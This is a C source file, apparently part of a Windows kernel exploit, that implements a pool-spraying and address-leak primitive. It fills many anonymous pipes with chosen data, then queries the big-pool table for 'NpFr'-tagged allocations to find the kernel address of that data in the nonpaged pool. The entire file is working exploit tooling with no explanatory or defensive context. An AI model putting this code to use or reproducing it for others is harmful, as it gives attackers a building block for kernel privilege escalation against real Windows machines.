#include "utils/pipes.h"
#include "utils/alloc.h"
#include "utils/error.h"
#include "utils/native.h"
#include "utils/vec.h"
#include <Windows.h>
#include <errhandlingapi.h>
#include <fileapi.h>
#include <minwindef.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>

bool pipes_create(Vec **pipes)
{
    Vec *vec_pipes = vec_new();
    HANDLE read_pipe = {0}, write_pipe = {0};
    NonPagedBuffer *entry = nullptr;
    BOOL result = FALSE;
    bool status = false;

    SECURITY_ATTRIBUTES sec_attributes = {0};

    sec_attributes.nLength = sizeof(sec_attributes);
    sec_attributes.bInheritHandle = TRUE;
    sec_attributes.lpSecurityDescriptor = nullptr;

    for (size_t i = 0; i < vec_pipes->capacity; i++)
    {
        result = CreatePipe(&read_pipe, &write_pipe, &sec_attributes, PIPE_BUFFER_SIZE + 0xf00);
        if (result == FALSE)
        {
            LOG_ERROR("Failed creating pipe. GetLastError: %ld\n", GetLastError());
            goto end;
        }

        entry = jalloc(sizeof(NonPagedBuffer));
        if (entry == nullptr)
        {
            LOG_ERROR("Failed allocating\n");
            goto end;
        }
        entry->write_pipe = write_pipe;
        entry->read_pipe = read_pipe;
        vec_add(vec_pipes, entry);
    }

    *pipes = vec_pipes;
    status = true;
end:
    return status;
}

bool pipes_map_buffer_in_nonpaged_pool(
    Vec *vec_pipes,
    size_t pipe_index,
    void *buffer,
    size_t buffer_len,
    HANDLE child_pipe,
    size_t *ret_address
)
{
    DWORD len = 0x1000;
    bool result = false, already_used = false;
    NTSTATUS status = 0;
    SYSTEM_BIGPOOL_INFORMATION *bigpool_infos = nullptr;

    size_t kernel_address = 0;
    NonPagedBuffer *current_entry = nullptr;
    BOOL res = FALSE;
    DWORD pipe_data_len = 0;
    void *pipe_data = jalloc(PIPE_BUFFER_SIZE);
    if (pipe_data == nullptr)
        goto end;

    memset(pipe_data, 'A', PIPE_BUFFER_SIZE);
    memcpy(pipe_data + 0x1000, buffer, buffer_len);

    res = WriteFile(
        ((NonPagedBuffer *)vec_pipes->buffer[pipe_index])->write_pipe,
        pipe_data,
        PIPE_BUFFER_SIZE,
        &pipe_data_len,
        nullptr
    );
    if (res == FALSE)
    {
        CHILD_LOG_ERROR(child_pipe, "Failed writing to pipe\n");
        goto end;
    }

    do
    {
        bigpool_infos = jrealloc(bigpool_infos, len);
        if (bigpool_infos == nullptr)
        {
            CHILD_LOG_ERROR(child_pipe, "Failed allocating memory.\n");
            goto end;
        }
        status = NtQuerySystemInformation(SystemBigPoolInformation, bigpool_infos, len, &len);
        if (status == STATUS_INFO_LENGTH_MISMATCH)
            len *= 2;

    } while (!NT_SUCCESS(status));

    CHILD_LOG_SUCCESS(child_pipe, "Number of bigpool entries : %ld\n", bigpool_infos->Count);

    for (size_t i = 0; i < bigpool_infos->Count; i++)
    {
        if (bigpool_infos->AllocatedInfo[i].TagUlong == 'rFpN')
        {
            CHILD_LOG_SUCCESS(
                child_pipe,
                "Tag: %s - Address : 0x%p - Size: %llx\n",
                bigpool_infos->AllocatedInfo[i].Tag,
                bigpool_infos->AllocatedInfo[i].VirtualAddress,
                bigpool_infos->AllocatedInfo[i].SizeInBytes
            );

            kernel_address = (size_t)bigpool_infos->AllocatedInfo[i].VirtualAddress & ~1;
            kernel_address += PIPE_HEADER_SIZE;
            kernel_address += 0x1000;
            // Check its the right one
            already_used = false;
            for (size_t i = 0; i < vec_pipes->length; i++)
            {
                current_entry = vec_pipes->buffer[i];
                if (kernel_address == current_entry->kernel_address)
                {
                    already_used = true;
                    break;
                }
            }

            if (already_used)
                continue;

            CHILD_LOG_SUCCESS(child_pipe, "Found kernel buffer : %llx\n", kernel_address);

            ((NonPagedBuffer *)vec_pipes->buffer[pipe_index])->kernel_address = kernel_address;
            *ret_address = kernel_address;
            result = true;

            break;
        }
    }

end:
    if (bigpool_infos != nullptr)
        jfree(bigpool_infos);
    if (pipe_data != nullptr)
        jfree(pipe_data);

    CHILD_LOG_SUCCESS(child_pipe, "Pipe %lld mapped @ %llx\n", pipe_index, kernel_address);

    return result;
}